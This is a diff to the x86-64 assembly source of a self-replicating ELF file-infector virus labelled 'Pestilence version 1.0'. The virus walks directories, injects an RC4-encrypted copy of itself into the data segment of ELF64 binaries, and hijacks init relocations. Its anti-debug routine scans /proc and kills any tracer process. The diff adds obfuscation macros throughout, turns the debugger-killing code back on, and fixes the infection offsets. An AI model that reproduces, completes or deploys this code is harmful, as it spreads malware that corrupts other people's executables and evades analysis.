@@ -17,10 +17,12 @@ _start:
     mov     rbp, rsp
     sub     rsp, 0x10
     lea     rdi, [rel cwd]
+    PUSH_RET
     mov     rsi, O_DIRECTORY | O_RDONLY
     xor     eax, eax
     add     al, SYS_OPEN
     syscall
+    OBF_USELESS_INSTR 1
     mov     [rsp], eax
     call    anti_debug_av
     lea     rdi, [rel dir1]
@@ -58,6 +60,7 @@ readdir:
     mov     rsi, 0x1000
     add     rdx, PROT_READ | PROT_WRITE
     mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
+    OBF_USELESS_INSTR 2
     xor     r8, r8
     dec     r8
     xor     r9, r9
@@ -82,13 +85,16 @@ loop_dir:
 loop_buf_dirent:
     mov     [rsp + 0x10], r8w
     mov     r9, [rsp + 0x8]
+    OBF_FAKE_JUMP
     cmp     BYTE [r9 + r8 + d_type], DT_REG
     jne     next_dirent
     lea     rdi, [r9 + r8 + d_name]
+    PUSH_RET
     call    infect
 next_dirent:
     mov     r9, [rsp + 0x8]
     movzx   r8, WORD [rsp + 0x10]
+    OBF_FAKE_JUMP
     add     r8w, [r9 + r8 + d_reclen]
     cmp     r8w, [rsp + 4]
     jl      loop_buf_dirent
@@ -113,10 +119,12 @@ generate_key:
     xor     rsi, rsi ; O_RDONLY
     mov     eax, SYS_OPEN
     syscall
+    OBF_FAKE_JUMP
     cmp     eax, 0
     jl      _end
     push    rax
     mov     rdi, rax
+    OBF_USELESS_INSTR 2
     lea     rsi, [rel key]
     mov     rdx, key_len
     mov     eax, SYS_READ
@@ -149,8 +157,10 @@ is_proc_dir:
     xor     eax, eax
     mov     rsi, rdi
 loop_is_proc_dir:
+    OBF_FAKE_JUMP
     cmp     BYTE [rsi], 0
     je      end_is_proc_dir
+    PUSH_RET
     mov     dil, BYTE [rsi]
     call    isnum
     inc     rsi
@@ -175,9 +185,11 @@ anti_debug_av:
     call    check_process
     
     lea     rdi, [rel proc_dir]
+    OBF_USELESS_INSTR 3
     mov     rsi, O_DIRECTORY | O_RDONLY
     xor     eax, eax
     add     eax, SYS_OPEN
+    PUSH_RET
     syscall
     mov     [rsp], eax
 
@@ -200,6 +212,7 @@ loop_proc:
     mov     rsi, [rsp + 0x8]
     mov     rdx, DIRENT_MAX_SIZE
     xor     eax, eax
+    OBF_FAKE_JUMP
     add     al, SYS_GETDENTS64
     syscall
     cmp     eax, 0
@@ -208,11 +221,13 @@ loop_proc:
     xor     r8, r8
 loop_proc_dirent:
     mov     [rsp + 0x10], r8w
+    PUSH_RET
     mov     r9, [rsp + 0x8]
     cmp     BYTE [r9 + r8 + d_type], DT_DIR
     jne     next_proc_dirent
     lea     rdi, [r9 + r8 + d_name]
     call    is_proc_dir
+    OBF_USELESS_INSTR 1
     test    al, al
     jz      next_proc_dirent
     lea     rdi, [r9 + r8 + d_name]
@@ -237,6 +252,7 @@ check_process:
     xor     rdi, rdi
     mov     rsi, 0x1000
     xor     rdx, rdx
+    PUSH_RET
     add     rdx, PROT_READ | PROT_WRITE
     mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
     xor     r8, r8
@@ -266,6 +282,7 @@ check_process:
     mov     edi, eax
     mov     rsi, [rsp]
     mov     rdx, 0x1000 - 1
+    OBF_FAKE_JUMP
     xor     eax, eax ; SYS_READ
     syscall
     cmp     eax, 0
@@ -274,6 +291,7 @@ check_process:
     mov     BYTE [rax], 0
     mov     eax, SYS_CLOSE
     syscall
+    OBF_USELESS_INSTR 2
     mov     rax, [rsp + 0x10]
     test    rax, rax
     jnz     test_debugger
@@ -282,23 +300,20 @@ check_process:
     call    test_forbidden_program
     jmp     munmap_quit_check_process
 test_debugger:
-;     mov     rdi, [rsp]
-;     lea     rsi, [rel tpid_str]
-;     call    strstr
-;     mov     rdi, rax
-;     call    atoi
-;     jmp     fkjmp_debug_test
-;     db 0x74
-; fkjmp_debug_test:
-;     test    eax, eax
-;     jz      munmap_quit_check_process
-;     mov     edi, eax
-;     mov     esi, SIGKILL
-;     mov     eax, SYS_KILL
-;     jmp     fkjmp_debug_test2
-;     db 0xe9
-; fkjmp_debug_test2:
-;     syscall
+    mov     rdi, [rsp]
+    lea     rsi, [rel tpid_str]
+    call    strstr
+    mov     rdi, rax
+    call    atoi
+    OBF_FAKE_JUMP
+    test    eax, eax
+    jz      munmap_quit_check_process
+    mov     edi, eax
+    PUSH_RET
+    mov     esi, SIGKILL
+    mov     eax, SYS_KILL
+    OBF_FAKE_JUMP
+    syscall
 munmap_quit_check_process:
     mov     rdi, rax
     mov     rsi, 0x1000
@@ -315,6 +330,7 @@ loop_program_blacklist:
     mov     rsi, r8
     repz    cmpsb
     mov     al, BYTE [rdi - 1]
+    OBF_FAKE_JUMP
     test    al, al
     jz      _end
     xor     al, al
@@ -334,6 +350,7 @@ strncmp:
 
 strlen:
     xor     rax, rax
+    OBF_USELESS_INSTR 3
     xor     rcx, rcx
     dec     rcx
     repnz   scasb
@@ -351,6 +368,7 @@ strstr:
     mov     rbp, rsp
     push    rdi
     push    rsi
+    OBF_FAKE_JUMP
     call    strlen
     push    rax
     mov     rdi, [rbp - 0x10]
@@ -361,6 +379,7 @@ loop_strstr:
     mov     rdi, [rsp + 0x18]
     add     rdi, r8
     mov     rsi, [rsp + 0x10]
+    PUSH_RET
     mov     rdx, [rsp]
     call    strncmp
     test    rax, rax
@@ -390,6 +409,7 @@ loop_atoi:
     sub     dil, '0'
     mov     ecx, 10
     mov     eax, ebx
+    OBF_FAKE_JUMP
     mul     ecx
     mov     ebx, eax
     add     ebx, edi
@@ -413,6 +433,7 @@ infect:
 
     mov     [rsp + fd], eax
     mov     edi, [rsp + fd]
+    OBF_FAKE_JUMP
     lea     rsi, [rsp + e_hdr]
     mov     rdx, ELFHDR_SIZE
     mov     eax, SYS_READ
@@ -422,6 +443,10 @@ infect:
     lea     rax, [rbx + e_ident]
     cmp     [rax], DWORD ELF_MAGIC
     jne     close_quit_infect
+    OBF_USELESS_INSTR 1
+    OBF_USELESS_INSTR 2
+    OBF_USELESS_INSTR 1
+    OBF_USELESS_INSTR 3
     cmp     [rax + EI_CLASS], BYTE ELFCLASS64
     jne     close_quit_infect
     cmp     [rax + EI_DATA], BYTE ELFDATA2LSB
@@ -466,6 +491,7 @@ right_type_check:
     movzx   rcx, WORD [rax + e_phnum]
 loop_phdrs:
     mov     r9, r8
+    OBF_FAKE_JUMP
     sub     r9, [rsp + map]
     cmp     [r8 + p_type], DWORD PT_LOAD
     jne     next_phdr
@@ -489,6 +515,7 @@ loop_sections:  ; We loop from the end of the section table to get
     mov     rbx, [rsp + map]
     movzx   rax, WORD [rbx + e_shnum]
     movzx   rcx, WORD [rbx + e_shentsize]
+    OBF_USELESS_INSTR 3
     mul     rcx
     add     rax, [rbx + e_shoff]
     add     rax, rbx
@@ -518,13 +545,14 @@ test_bss:
     test    QWORD [rax + sh_flags], SHF_TLS
     jnz     test_rela
     mov     QWORD [rsp + bss_shdr_off], rax
+    PUSH_RET
     sub     QWORD [rsp + bss_shdr_off], rbx
 test_rela:
     cmp     r9d, SHT_RELA
     je      get_init_rela
 next_section:
     loop    test_last_text
-    jmp     remap_and_infect_data
+    jmp     check_text_padding
 
 get_init_rela:
     mov     r8, [rsp + map]
@@ -535,6 +563,7 @@ get_init_rela:
     mov     QWORD [rsp + old_init_func], r8
     mov     r10, [r10 + sh_addr]
     mov     r11, [rsp + map]
+    OBF_FAKE_JUMP
     add     r11, [rax + sh_offset]
     mov     r12, r11
     add     r12, [rax + sh_size]
@@ -546,19 +575,41 @@ loop_rela:
     jl      loop_rela
     jmp     next_section
 found_init_rela:
+    OBF_USELESS_INSTR 1
     mov     QWORD [rsp + init_rela_entry_off], r11
     sub     QWORD [rsp + init_rela_entry_off], rbx
     jmp     next_section
 
-remap_and_infect_data:
+check_text_padding:
+    mov     r8, [rsp + map]
+    mov     r9, r8
+    add     r9w, WORD [r8 + e_phentsize]
+    add     r8, [rsp + text_phdr_off]
+    add     r9, [rsp + text_phdr_off]
+    mov     rbx, [r8 + p_offset]
+    add     rbx, [r8 + p_filesz]
+    mov     rax, [r9 + p_offset]
+    sub     rax, rbx
     cmp     rax, payload_mprotect_len
     jle     munmap_quit_infect
 
+remap_and_infect_data:
     mov     edi, DWORD [rsp + fd]
     mov     rax, [rsp + map]
+    PUSH_RET
     add     rax, [rsp + bss_shdr_off]
+    mov     rbx, [rax + sh_addr]
+    cmp     rbx, [rax + sh_offset]
+    jnz     bss_address_offset_diff
+    xor     rbx, rbx
+    jmp     adjust_file_size
+bss_address_offset_diff:
+    sub     rbx, [rax + sh_offset]
+    sub     rbx, 0x1000
+adjust_file_size:
     mov     rsi, [rsp + file_size]
     add     rsi, [rax + sh_size]
+    add     rsi, rbx
     add     rsi, virus_len
     mov     QWORD [rsp + new_file_size], rsi
     mov     eax, SYS_FTRUNCATE
@@ -566,6 +617,7 @@ remap_and_infect_data:
     test    eax, eax
     jnz     munmap_quit_infect
 
+    OBF_FAKE_JUMP
     mov     rdi, [rsp + map]
     mov     rsi, [rsp + file_size]
     mov     rdx, [rsp + new_file_size]
@@ -580,6 +632,7 @@ remap_and_infect_data:
 shift_end_of_file:
     mov     rdi, [rsp + new_file_size]
     mov     rsi, [rsp + file_size]
+    OBF_USELESS_INSTR 2
     mov     rcx, rsi
     add     rdi, rax
     add     rsi, rax
@@ -597,19 +650,21 @@ update_offsets_everywhere:
     mov     r9, [rsp + new_file_size]
     sub     r9, [rsp + file_size]
     add     [rsp + bss_shdr_off], r9
+    PUSH_RET
     add     [rsp + last_text_shdr_off], r9
     add     [rsp + init_array_shdr_off], r9
     mov     rax, [rsp + map]
     add     [rax + e_shoff], r9
     mov     rcx, [rsp + bss_shdr_off]
     sub     rcx, [rax + e_shoff]
-    mov     bx, [rax + e_shnum]
+    mov     r10w, [rax + e_shnum]
     movzx   r8, WORD [rax + e_shentsize]
     mov     rax, rcx
     cqo
     div     r8
-    movzx   rcx, bx
+    movzx   rcx, r10w
     sub     rcx, rax
+    dec     rcx ; r10w -> number, rax -> index so we have to shift it by -1
     mov     rax, [rsp + map]
     add     rax, [rsp + bss_shdr_off]
     add     rax, r8
@@ -620,15 +675,16 @@ shift_last_sections:
 
 update_sizes:
     mov     rax, [rsp + map]
-    mov     rbx, rax
+    mov     r9, rax
     add     rax, [rsp + bss_shdr_off]
+    OBF_USELESS_INSTR 1
     mov     r10, [rax + sh_size]
-    add     rbx, [rsp + data_phdr_off]
-    add     QWORD [rbx + p_filesz], virus_len
-    add     [rbx + p_filesz], r10
-    add     QWORD [rbx + p_memsz], virus_len
-    mov     r12, [rbx + p_memsz]
-    sub     r12, [rbx + p_filesz]
+    add     r9, [rsp + data_phdr_off]
+    add     QWORD [r9 + p_filesz], virus_len
+    add     QWORD [r9 + p_filesz], rbx
+    add     [r9 + p_filesz], r10
+    add     QWORD [r9 + p_memsz], virus_len
+    add     QWORD [r9 + p_memsz], rbx
     add     QWORD [rax + sh_size], virus_len
     mov     DWORD [rax + sh_type], SHT_PROGBITS
 
@@ -636,10 +692,14 @@ update_sizes:
     mov     rdi, [rsp + map]
     add     rdi, [rdx + sh_offset]
     mov     rcx, r10
+    add     rcx, rbx
 write_bss:
     xor     al, al
     stosb
     loop    write_bss
+
+align_bss_offset_and_address:
+    add     [rdx + sh_offset], rbx
 
 copy_virus_in_data:
     mov     rdi, [rsp + map]
@@ -648,6 +708,7 @@ copy_virus_in_data:
     lea     rsi, [rel _start]
     mov     rcx, virus_lenq
     call    copy_payload
+    PUSH_RET
 
     mov     rax, [rsp + map]
     add     rax, [rsp + bss_shdr_off]
@@ -656,12 +717,12 @@ copy_virus_in_data:
     mov     [rsp + payload_data_base_offset], rdx
     mov     rdx, [rax + sh_addr]
     add     rdx, r10
-    sub     rdx, r12
     mov     [rsp + payload_data_base_address], rdx
 
 crypt_virus:
     call    generate_key
     mov     rdi, [rsp + map]
+    OBF_FAKE_JUMP
     add     rdi, [rsp + payload_data_base_offset]
     mov     rsi, virus_len
     push    rdx
@@ -670,12 +731,11 @@ crypt_virus:
 
 format_text_code_chunk:
     mov     rbx, [rsp + map]
+    OBF_USELESS_INSTR 3
     add     rbx, [rsp + data_phdr_off]
     mov     r8, [rbx + p_vaddr]
-    mov     rax, r8
-    cqo
-    mov     r9, QWORD 0x1000
-    div     r9
+    mov     rdx, r8
+    and     rdx, 0xfff
     sub     r8, rdx
     mov     rcx, [rbx + p_filesz]
     add     rcx, rdx
@@ -694,6 +754,7 @@ format_text_code_chunk:
     mov     rdi, [rax + p_offset]
     add     rdi, [rax + p_filesz]
     mov     [rsp + payload_base_offset], rdi
+    OBF_USELESS_INSTR 2
     add     rdi, [rsp + map]
     mov     rcx, payload_mprotect_len
 copy_text_code_chunk:
@@ -709,6 +770,7 @@ copy_text_code_chunk:
     add     rbx, [rsp + last_text_shdr_off]
     add     QWORD [rbx + sh_size], payload_mprotect_len
 
+    PUSH_RET
     mov     rdx, [rsp + new_file_size]
     mov     [rsp + file_size], rdx
     mov     rdi, [rsp + payload_base_offset]
@@ -745,6 +807,7 @@ munmap_quit_infect:
     syscall
 
 close_quit_infect:
+    OBF_FAKE_JUMP
     mov     edi, [rsp + fd]
     mov     eax, SYS_CLOSE
     syscall
@@ -770,22 +833,24 @@ payload_mprotect:
     push    rbx
     push    r12
     lea     rdi, [rel payload_mprotect]
+    OBF_FAKE_JUMP
     add     rdi, [rel data_addr_offset]
     mov     rsi, [rel data_len]
     mov     rdx, PROT_READ | PROT_WRITE | PROT_EXEC
+    PUSH_RET
     xor     rax, rax
     add     rax, SYS_MPROTECT
     syscall
     lea     rdi, [rel payload_mprotect]
     add     rdi, [rel data_addr_offset]
+    OBF_FAKE_JUMP
     add     rdi, [rel data_len]
     sub     rdi, virus_len
     mov     rsi, virus_len
+    push    rdi
     call    rc4
-    lea     rax, [rel payload_mprotect]
-    add     rax, [rel data_addr_offset]
-    add     rax, [rel data_len]
-    sub     rax, virus_len
+    OBF_USELESS_INSTR 1
+    pop     rax
     call    rax
     pop     r12
     pop     rbx
@@ -801,6 +866,7 @@ rc4:
     mov     rbp, rsp
     sub     rsp, 0x120
     sub     rsp, rsi
+    OBF_FAKE_JUMP
     mov     [rsp], rdi
     mov     [rsp + 0x8], rsi
     mov     rcx, 0x100
@@ -814,6 +880,7 @@ loop_init_vector:
     xor     r8, r8
     xor     r9, r9
     lea     rdi, [rel key]
+    PUSH_RET
     lea     rsi, [rsp + 0x10]
     mov     cx, 0x100
 rc4_init_loop:
@@ -821,15 +888,18 @@ rc4_init_loop:
     and     rax, 0x1f ; rax % key_len
     add     rax, rdi
     movzx   rdx, BYTE [rax]
+    OBF_FAKE_JUMP
     mov     rbx, r8
     add     rbx, rsi
     movzx   r10, BYTE [rbx]
     add     r9, r10
+    OBF_USELESS_INSTR 3
     add     r9, rdx
     movzx   r9, r9b
     mov     rax, r9
     add     rax, rsi
     mov     dl, BYTE [rax]
+    OBF_FAKE_JUMP
     mov     BYTE [rax], r10b
     mov     BYTE [rbx], dl
     inc     r8
@@ -838,6 +908,7 @@ rc4_init_loop:
 rc4_crypt:
     mov     rcx, [rsp + 0x8]
     lea     rdi, [rsp + 0x110]
+    OBF_FAKE_JUMP
     mov     rsi, [rsp]
     lea     r10, [rsp + 0x10]
     xor     r8, r8
@@ -849,17 +920,21 @@ rc4_crypt_loop:
     mov     r11, r10
     add     r11, r8
     add     r9b, [r11]
+    OBF_FAKE_JUMP
     movzx   r9, r9b
     mov     r12, r10
     add     r12, r9
+    PUSH_RET
     mov     dl, [r12]
     mov     bl, [r11]
     mov     [r12], bl
     mov     [r11], dl
     mov     dl, [r11]
     add     dl, [r12]
+    OBF_FAKE_JUMP
     movzx   rdx, dl
     add     rdx, r10
+    OBF_USELESS_INSTR 2
     mov     al, [rdx]
     xor     al, BYTE [rsi]
     mov     BYTE [rdi], al
@@ -869,6 +944,7 @@ rc4_crypt_loop:
 
     mov     rdi, [rsp]
     lea     rsi, [rsp + 0x110]
+    OBF_FAKE_JUMP
     mov     rcx, [rsp + 0x8]
 copy_crypted_mem:
     lodsb
@@ -880,7 +956,7 @@ copy_crypted_mem:
 
     key_len equ 32
     key: TIMES key_len db 0
-    signature: db "Pestilence version 1.0 (c)oded by alagroy-", 0
+    signature: db 0, "Pestilence version 1.0 (c)oded by alagroy-", 0
     data_len: dq 0
     data_addr_offset: dq 0
 
